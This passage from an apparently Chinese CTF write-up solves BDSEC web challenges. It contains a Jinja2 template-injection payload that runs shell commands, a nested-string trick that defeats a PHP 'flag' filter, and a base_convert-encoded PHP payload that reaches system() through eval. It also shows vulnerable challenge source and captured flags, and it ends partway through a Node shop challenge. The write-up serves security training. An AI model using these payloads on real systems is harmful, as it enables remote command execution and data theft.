class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;&#123;% <span class="keyword">endif</span> %&#125;&#123;% <span class="keyword">endfor</span> %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220720233225401.png" alt="image-20220720233225401"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c in [].__class__.__base__.<span class="title function_ invoke__">__subclasses__</span>() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123;  c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="keyword">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;&#123;% <span class="keyword">endif</span> %&#125;&#123;% <span class="keyword">endfor</span> %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220720233256890.png" alt="image-20220720233256890"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BDSEC&#123;Y3Y_7H1515_7H3_F146&#125;</span><br></pre></td></tr></table></figure><h2 id="Awesome-Note-Keeping"><a href="#Awesome-Note-Keeping" class="headerlink" title="Awesome Note Keeping"></a>Awesome Note Keeping</h2><p>源码泄露index.php.bak</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220720234924808.png" alt="image-20220720234924808"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Awesome Note Keeping&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body style=<span class="string">&quot;padding: 100px; background: #000000; color: #09b576&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;Welcome to Awesome Note Keeping&lt;/h1&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_startup_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;note&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;note_title&quot;</span>])) &#123;<span class="comment">//这里是写入的方法</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;note&quot;</span>]) || <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;note_title&quot;</span>])) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;All fields are required.&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&quot;note_title&quot;</span>]) &gt;= <span class="number">13</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Note title is too long.&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&quot;note&quot;</span>]) &gt;= <span class="number">40</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Note is too long.&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$note_title</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&quot;note_title&quot;</span>]);<span class="comment">//替换flag</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$note_title</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$note_title</span> . <span class="string">&quot;.txt&quot;</span>)) &#123;<span class="comment">//如果存在，就把其展示出来</span></span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;There is already a note with that title and the note is &lt;br&gt;&quot;</span>;</span><br><span class="line">                    <span class="variable">$note_title</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$note_title</span>);</span><br><span class="line">                    <span class="variable">$myNote</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$note_title</span> . <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">                    <span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$myNote</span>, <span class="title function_ invoke__">filesize</span>(<span class="variable">$note_title</span> . <span class="string">&quot;.txt&quot;</span>));</span><br><span class="line">                    <span class="title function_ invoke__">fclose</span>(<span class="variable">$myNote</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;<span class="comment">//如果不存在，就写入进去</span></span><br><span class="line">                    <span class="variable">$myNote</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$note_title</span> . <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">                    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$myNote</span>, <span class="variable">$_POST</span>[<span class="string">&quot;note&quot;</span>]);</span><br><span class="line">                    <span class="title function_ invoke__">fclose</span>(<span class="variable">$myNote</span>);</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;Your note has been saved.&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Sorry ! You can&#x27;t create flag note.&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;note_title&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&quot;note_title&quot;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&quot;note_title&quot;</span>] != <span class="string">&quot;flag&quot;</span>) &#123;<span class="comment">//这里是读取信息的方法</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$_GET</span>[<span class="string">&quot;note_title&quot;</span>] . <span class="string">&quot;.txt&quot;</span>)) &#123;</span><br><span class="line">            <span class="variable">$myNote</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$_GET</span>[<span class="string">&quot;note_title&quot;</span>] . <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$myNote</span>, <span class="title function_ invoke__">filesize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;note_title&quot;</span>] . <span class="string">&quot;.txt&quot;</span>));</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$myNote</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Sorry ! Couldn&#x27;t find any note with that title.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意在写入的时候，会对<code>$note_title</code>进行两次替换，将flag替换为空，所以整两次嵌套</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flaflflagagg</span><br></pre></td></tr></table></figure><p>并且第一次要创建一下<code>$note_title=flaflflagagg</code>，然后第二次的时候，满足第25行的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$note_title</span> . <span class="string">&quot;.txt&quot;</span>))</span><br></pre></td></tr></table></figure><p>然后才会替换flag为空，读取flag.txt</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220720234906221.png" alt="image-20220720234906221"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BDSEC&#123;tHe_n0t3_K33p1n6_4W350M3_N5&#125;</span><br></pre></td></tr></table></figure><h2 id="Awesome-Calculator"><a href="#Awesome-Calculator" class="headerlink" title="Awesome Calculator"></a>Awesome Calculator</h2><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filtering</span>(<span class="params"><span class="variable">$query</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$query</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$query</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/([a-z_]+)/&quot;</span>, <span class="variable">$query</span>, <span class="variable">$words</span>);</span><br><span class="line">    <span class="variable">$words</span> = <span class="variable">$words</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$good</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>, <span class="string">&#x27;ncr&#x27;</span>, <span class="string">&#x27;npr&#x27;</span>, <span class="string">&#x27;number_format&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>];</span><br><span class="line">    <span class="variable">$accept_chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789.!^&amp;|+-*/%()[],_&#x27;</span>;</span><br><span class="line">    <span class="variable">$accept_chars</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$accept_chars</span>);</span><br><span class="line">    <span class="variable">$illegal</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$words</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$words</span>[<span class="variable">$i</span>]) &amp;&amp; <span class="title function_ invoke__">array_search</span>(<span class="variable">$words</span>[<span class="variable">$i</span>], <span class="variable">$good</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$illegal</span> .= <span class="variable">$words</span>[<span class="variable">$i</span>] . <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$query</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">array_search</span>(<span class="variable">$query</span>[<span class="variable">$i</span>], <span class="variable">$accept_chars</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$illegal</span> .= <span class="variable">$query</span>[<span class="variable">$i</span>] . <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$illegal</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_calculations</span>(<span class="params"><span class="variable">$argument</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$argument</span>) &gt; <span class="number">1030</span>) <span class="keyword">return</span> <span class="string">&quot;Calculation too long.&quot;</span>;</span><br><span class="line">    <span class="variable">$argument</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$argument</span>);</span><br><span class="line">    <span class="variable">$illegal</span> = <span class="title function_ invoke__">filtering</span>(<span class="variable">$argument</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$illegal</span>)))</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&quot;Oh my god ! What is this: &quot;</span> . <span class="variable">$illegal</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;$result=&#x27;</span> . <span class="variable">$argument</span> . <span class="string">&quot;;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]) &amp;&amp; <span class="keyword">die</span>(<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;My Awesome Calculator&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;body style=<span class="string">&quot;margin: 50px;&quot;</span>&gt;</span><br><span class="line">    &lt;h1&gt;My Awesome Calculator&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form&gt;</span><br><span class="line"></span><br><span class="line">        &lt;input placeholder=<span class="string">&quot;Surprise me with calculations&quot;</span> type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;calculation&quot;</span> value=<span class="string">&quot;&lt;?= <span class="subst">$_GET</span>[&#x27;calculation&#x27;] ?? &#x27;&#x27; ?&gt;&quot;</span> style=<span class="string">&quot;padding: 150px; font-size: 40px;&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;calculation&#x27;</span>])) : <span class="meta">?&gt;</span></span><br><span class="line">        &lt;div&gt;</span><br><span class="line">            &lt;div style=<span class="string">&quot;font-size: 40px;&quot;</span>&gt;</span><br><span class="line">                Result : <span class="meta">&lt;?=</span> @<span class="title function_ invoke__">do_calculations</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;calculation&#x27;</span>]) <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">endif</span> <span class="meta">?&gt;</span></span><br><span class="line">    &lt;a href=<span class="string">&quot;?source&quot;</span>&gt;Source&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><p>原题</p><p><a href="https://ctftime.org/writeup/25765">CTFtime.org &#x2F; BambooFox CTF 2021 &#x2F; Calc.exe Online &#x2F; Writeup</a></p><p>cat &#x2F;etc&#x2F;passwd</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">1751504350</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">base_convert</span>(<span class="number">477080140104</span>,<span class="number">10</span>,<span class="number">36</span>).<span class="title function_ invoke__">base_convert</span>(<span class="number">189751590363</span>,<span class="number">10</span>,<span class="number">36</span>).<span class="title function_ invoke__">base_convert</span>(<span class="number">189803607951</span>,<span class="number">10</span>,<span class="number">36</span>).<span class="title function_ invoke__">base_convert</span>(<span class="number">428637964</span>,<span class="number">10</span>,<span class="number">36</span>)))</span><br></pre></td></tr></table></figure><p>其中对应关系</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">1751504350</span>,<span class="number">10</span>,<span class="number">36</span>) system</span><br><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>) hex2bin</span><br></pre></td></tr></table></figure><p>在原有的wp上进行修改，将&#x2F;ect&#x2F;passwd替换为<code>*</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base_convert</span>(<span class="number">82</span>,<span class="number">10</span>,<span class="number">36</span>)));   <span class="comment">//*</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">base_convert</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;*&quot;</span>),<span class="number">36</span>,<span class="number">10</span>));</span><br></pre></td></tr></table></figure><p>最后的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">1751504350</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">base_convert</span>(<span class="number">477080140104</span>,<span class="number">10</span>,<span class="number">36</span>).<span class="title function_ invoke__">base_convert</span>(<span class="number">82</span>,<span class="number">10</span>,<span class="number">36</span>)))</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220721002946630.png" alt="image-20220721002946630"></p><h2 id="Knight-Squad-Shop"><a href="#Knight-Squad-Shop" class="headerlink" title="Knight Squad Shop"></a>Knight Squad Shop</h2><p>给了附件</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220721110744901.png" alt="image-20220721110744901"></p><p>主界面</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220721004053128.png" alt="image-20220721004053128"></p><p>源码中主要是三个路由</p><ol><li>&#x2F;api&#x2F;v1&#x2F;sell</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api/v1/sell&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> [key, value] <span class="keyword">of</span> <span class="title class_">Object</span>.<span class="title function_">entries</span>(req.<span class="property">body</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key === <span class="string">&#x27;flags&#x27;</span> &amp;&amp; !req.<span class="property">session</span>.<span class="property">admin</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!products[key]) &#123;</span><br><span class="line">            products[key] = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(product));        </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> [k, v] <span class="keyword">of</span> <span class="title class_">Object</span>.<span class="title function_">entries</span>(value)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (k === <span class="string">&#x27;quantity&#x27;</span>) &#123;</span><br><span class="line">                products[key][k] += v;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                products[key][k] = v;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;Sell successful&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ol start="2"><li>&#x2F;api&#x2F;v1&#x2F;buy 购买相关产品</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api/v1/buy&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; product, quantity &#125; = req.<span class="property">body</span>;     </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> product === <span class="string">&#x27;undefined&#x27;</span> || <span class="keyword">typeof</span> quantity !== <span class="string">&#x27;number&#x27;</span> || quantity &lt;= <span class="number">0</span> || !products[product]) &#123;    <span class="comment">//products[product]要存在</span></span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid request&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (products[product].<span class="property">quantity</span> &gt;= quantity) &#123;</span><br><span class="line">        <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">money</span> &gt;= products[product].<span class="property">price</span> * quantity) &#123;</span><br><span class="line">            products[product].<span class="property">quantity</span> -= quantity;</span><br><span class="line">            req.<span class="property">session</span>.<span class="property">money</span> -= products[product].<span class="property">price</span> * quantity;</span><br><span class="line">            res.<span class="title function_">json</span>(products[product]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">402</span>).<span class="title function_">send</span>(<span class="string">&#x27;Not enough money&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">451</span>).<span class="title function_">send</span>(<span class="string">&#x27;Not enough product&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ol start="3"><li>&#x2F;api&#x2F;v1&#x2F;money 可以修改金额</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api/v1/money&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">admin</span>) &#123;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">money</span> += req.<span class="property">body</span>.<span class="property">money</span>;    </span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;Money added&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Not admin&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span 